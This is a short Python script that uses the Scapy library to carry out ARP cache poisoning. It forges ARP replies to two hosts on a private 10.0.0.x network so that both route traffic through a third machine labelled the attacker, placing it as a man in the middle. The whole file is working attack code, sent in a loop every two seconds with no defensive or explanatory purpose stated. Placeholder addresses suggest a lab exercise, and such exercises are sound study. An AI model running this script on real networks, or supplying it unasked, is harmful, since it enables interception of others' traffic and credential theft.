from scapy.all import *
import time

# IP addresses of Host 1, Host 2, and Host 3
host1_ip = "10.0.0.1"  # Host 1 IP
host2_ip = "10.0.0.2"  # Host 2 IP
host3_ip = "10.0.0.3"  # Host 3 IP (Attacker)

# MAC addresses of Host 1, Host 2, and Host 3
host1_mac = "00:00:00:00:00:01"  # You can dynamically find this using ARP
host2_mac = "00:00:00:00:00:02"  # You can dynamically find this using ARP
host3_mac = "00:00:00:00:00:03"  # Attacker's MAC

def poison_arp_cache():
    print("Starting ARP poisoning...")

    # ARP Poison Host 1: Make Host 1 think Host 3 is Host 2
    poison_host1 = ARP(op=2, pdst=host1_ip, hwdst=host1_mac, psrc=host2_ip, hwsrc=host3_mac)

    # ARP Poison Host 2: Make Host 2 think Host 3 is Host 1
    poison_host2 = ARP(op=2, pdst=host2_ip, hwdst=host2_mac, psrc=host1_ip, hwsrc=host3_mac)

    try:
        while True:
            # Continuously send ARP poison packets to both hosts
            send(poison_host1, verbose=False)
            send(poison_host2, verbose=False)
            print(f"Poisoning {host1_ip} and {host2_ip}")
            time.sleep(2)  # Send every 2 seconds
    except KeyboardInterrupt:
        print("ARP poisoning stopped.")

if __name__ == "__main__":
    poison_arp_cache()
